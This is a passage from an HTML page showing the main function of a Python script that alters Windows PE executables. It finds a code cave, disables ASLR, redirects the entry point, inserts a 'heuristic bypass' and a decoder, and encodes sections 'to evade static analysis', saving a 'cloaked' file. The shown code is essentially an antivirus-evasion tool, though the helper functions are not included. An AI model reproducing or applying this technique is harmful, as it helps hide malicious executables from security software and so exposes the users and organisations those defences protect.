style="color:#0088ff;font-weight:400">#&nbsp;open&nbsp;file&nbsp;for&nbsp;modification</span><br />	<span style="color:#ff9d00;font-weight:700">try</span>:<br />		pe&nbsp;=&nbsp;&nbsp;pefile.PE(<span style="color:#ff9d00;font-weight:700">file</span>)<br />	<span style="color:#ff9d00;font-weight:700">except</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;ERROR:&nbsp;Cannot&nbsp;open&nbsp;file&nbsp;[%s]&nbsp;for&nbsp;modification"</span>&nbsp;%&nbsp;<span style="color:#ff9d00;font-weight:700">file</span><br />		sys.exit()<br /><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;entry&nbsp;point</span><br />	ep,&nbsp;ep_ava&nbsp;=&nbsp;get_entry(pe)<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;print&nbsp;info&nbsp;for&nbsp;given&nbsp;section&nbsp;and&nbsp;exit</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;section_info:<br />		get_info(pe,&nbsp;section_info)<br />		sys.exit()&nbsp;<br />		<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;print&nbsp;hex&nbsp;and&nbsp;ascii&nbsp;bytes&nbsp;for&nbsp;given&nbsp;section&nbsp;/&nbsp;range	</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;print_section:<br />		print_section_bytes(pe,&nbsp;section_range)<br />		sys.exit()	<br />		<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;split&nbsp;the&nbsp;file&nbsp;into&nbsp;multiple&nbsp;chunks</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;chunk_size:<br />		chunk_file(<span style="color:#ff9d00;font-weight:700">file</span>,&nbsp;chunk_size)<br />		sys.exit()<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;since&nbsp;we're&nbsp;using&nbsp;the&nbsp;image&nbsp;base&nbsp;as&nbsp;our&nbsp;starting&nbsp;point&nbsp;we&nbsp;need&nbsp;to&nbsp;</span><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;ensure&nbsp;that&nbsp;ASLR&nbsp;is&nbsp;disabled</span><br />	disable_aslr(pe)<br /><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;our&nbsp;code&nbsp;cave&nbsp;location&nbsp;information</span><br />	pe,&nbsp;code_cave_address,&nbsp;code_cave_virtual_offset,&nbsp;code_cave_raw_offset,&nbsp;code_cave_section&nbsp;=&nbsp;get_code_cave(pe,&nbsp;skip_cave_search)<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;print&nbsp;section&nbsp;information</span><br />	get_sections(pe)<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;modify&nbsp;sections&nbsp;other&nbsp;than&nbsp;.text&nbsp;(optional)</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;section_to_mod:<br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;mod_range&nbsp;<span style="color:#ff9d00;font-weight:700">and</span>&nbsp;mod_type:<br />			mod_section(pe,&nbsp;section_to_mod,&nbsp;mod_type,&nbsp;mod_range)<br />		<span style="color:#ff9d00;font-weight:700">else</span>:<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;Invalid&nbsp;options&nbsp;passed&nbsp;for&nbsp;custom&nbsp;section&nbsp;modification.&nbsp;Ignoring."</span><br /><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;Prepare&nbsp;to&nbsp;overwrite&nbsp;jump&nbsp;location&nbsp;</span><br />	jmp_overwrite_location&nbsp;=&nbsp;find_overwrite_location(pe)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;the&nbsp;location&nbsp;to&nbsp;overwrite&nbsp;jump&nbsp;instruction&nbsp;to&nbsp;code&nbsp;cave</span><br />	code_cave_jump&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\xe8"</span>&nbsp;+&nbsp;code_cave_virtual_offset&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;generate&nbsp;jump&nbsp;instruction&nbsp;to&nbsp;code&nbsp;cave</span><br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;grab&nbsp;the&nbsp;saved&nbsp;entry&nbsp;instructions&nbsp;in&nbsp;original&nbsp;byte&nbsp;form&nbsp;and&nbsp;as&nbsp;a&nbsp;dictionary&nbsp;of&nbsp;text-based&nbsp;commands&nbsp;</span><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;which&nbsp;will&nbsp;be&nbsp;used&nbsp;in&nbsp;the&nbsp;modification&nbsp;routine&nbsp;at&nbsp;the&nbsp;end&nbsp;of&nbsp;this&nbsp;function&nbsp;</span><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;len(jmp_instruction)&nbsp;is&nbsp;passed&nbsp;to&nbsp;determine&nbsp;how&nbsp;many&nbsp;instructions&nbsp;will&nbsp;be&nbsp;replaced&nbsp;by&nbsp;the&nbsp;jump</span><br />	saved_entry_instructions&nbsp;=&nbsp;preserve_entry_instructions(pe,&nbsp;ep,&nbsp;ep_ava,&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(code_cave_jump))<br /><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;sometimes&nbsp;if&nbsp;the&nbsp;code&nbsp;cave&nbsp;jump&nbsp;overwrite&nbsp;is&nbsp;shorter&nbsp;than&nbsp;the&nbsp;replaced&nbsp;instructions&nbsp;it&nbsp;can&nbsp;corrupt&nbsp;execution&nbsp;if</span><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;the&nbsp;program&nbsp;jumps&nbsp;back&nbsp;towards&nbsp;the&nbsp;beginning.&nbsp;This&nbsp;tries&nbsp;to&nbsp;address&nbsp;that&nbsp;by&nbsp;filling&nbsp;any&nbsp;difference&nbsp;with&nbsp;nops</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(code_cave_jump)&nbsp;&lt;&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(saved_entry_instructions):<br />		pe.set_bytes_at_offset(jmp_overwrite_location+<span style="color:#ff9d00;font-weight:700">len</span>(code_cave_jump),&nbsp;<span style="color:#3ad900;font-weight:400">"\x90"</span>&nbsp;*&nbsp;(<span style="color:#ff9d00;font-weight:700">len</span>(saved_entry_instructions)&nbsp;-&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(code_cave_jump)))<br />		<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;build&nbsp;heuristic&nbsp;bypass</span><br />	heuristic_bypass&nbsp;=&nbsp;build_heuristic_bypass(heuristic_iterations)<br /><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;build&nbsp;the&nbsp;encoder</span><br />	encoder&nbsp;=&nbsp;build_encoder(heuristic_iterations)<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;encode&nbsp;the&nbsp;given&nbsp;section(s)&nbsp;to&nbsp;evade&nbsp;static&nbsp;analysis&nbsp;(returns&nbsp;corresponding&nbsp;decoder&nbsp;instructions)</span><br />	decoder&nbsp;=&nbsp;encode_data(pe,&nbsp;section_to_encode,&nbsp;encoder)<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;modify&nbsp;the&nbsp;entry&nbsp;instructions&nbsp;to&nbsp;rewrite&nbsp;any&nbsp;relative&nbsp;jump&nbsp;addresses&nbsp;that&nbsp;might&nbsp;exist</span><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;we&nbsp;pass&nbsp;the&nbsp;code_cave_address&nbsp;and&nbsp;length&nbsp;of&nbsp;heuristic&nbsp;bypass/decoder&nbsp;so&nbsp;we&nbsp;can&nbsp;determine&nbsp;the&nbsp;offset&nbsp;to&nbsp;the&nbsp;final</span><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;jump&nbsp;instructions&nbsp;that&nbsp;will&nbsp;appear&nbsp;at&nbsp;the&nbsp;end&nbsp;of&nbsp;the&nbsp;code&nbsp;cave&nbsp;to&nbsp;resume&nbsp;normal&nbsp;execution&nbsp;flow</span><br />	modified_entry_instructions&nbsp;=&nbsp;modify_entry_instructions(ep_ava,&nbsp;saved_entry_instructions,&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(heuristic_bypass&nbsp;+&nbsp;decoder),&nbsp;code_cave_address)<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;replace&nbsp;first&nbsp;bytes&nbsp;of&nbsp;the&nbsp;entry&nbsp;point&nbsp;with&nbsp;jump&nbsp;to&nbsp;code&nbsp;cave</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Overwriting&nbsp;first&nbsp;bytes&nbsp;at&nbsp;physical&nbsp;address&nbsp;%08x&nbsp;with&nbsp;jump&nbsp;to&nbsp;code&nbsp;cave"</span>&nbsp;%&nbsp;(jmp_overwrite_location)&nbsp;<br />	pe.set_bytes_at_offset(jmp_overwrite_location,&nbsp;code_cave_jump)<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;generate&nbsp;the&nbsp;instructions&nbsp;to&nbsp;restore&nbsp;execution&nbsp;flow&nbsp;</span><br />	current_address&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(code_cave_address,&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(heuristic_bypass&nbsp;+&nbsp;decoder&nbsp;+&nbsp;modified_entry_instructions)&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;calculate&nbsp;current&nbsp;address&nbsp;from&nbsp;start&nbsp;of&nbsp;code&nbsp;cave</span><br />	new_entry_address&nbsp;=&nbsp;ep_ava&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(saved_entry_instructions)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;the&nbsp;new&nbsp;entry&nbsp;address&nbsp;=&nbsp;old&nbsp;entry&nbsp;+&nbsp;length&nbsp;of&nbsp;the&nbsp;overwritten&nbsp;entry&nbsp;instructions</span><br />	restore_execution_flow&nbsp;=&nbsp;build_new_entry_jump(current_address,&nbsp;new_entry_address)<br /><br />	<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;heuristic&nbsp;defeating&nbsp;code&nbsp;and&nbsp;decoder&nbsp;to&nbsp;code&nbsp;cave</span><br />	write_codecave(pe,&nbsp;code_cave_section,&nbsp;code_cave_raw_offset,&nbsp;heuristic_bypass,&nbsp;decoder,&nbsp;modified_entry_instructions,&nbsp;restore_execution_flow)<br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;all&nbsp;changes&nbsp;to&nbsp;modified&nbsp;file</span><br />	save_cloaked_pe(pe,&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>)	<br />	<br /><span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#333333;font-weight:400">__name__</span>&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">'__main__'</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;main(sys.argv[<span style="color:#ff0044;font-weight:400">1</span>:])<br /><br /></div></div></div></body></html>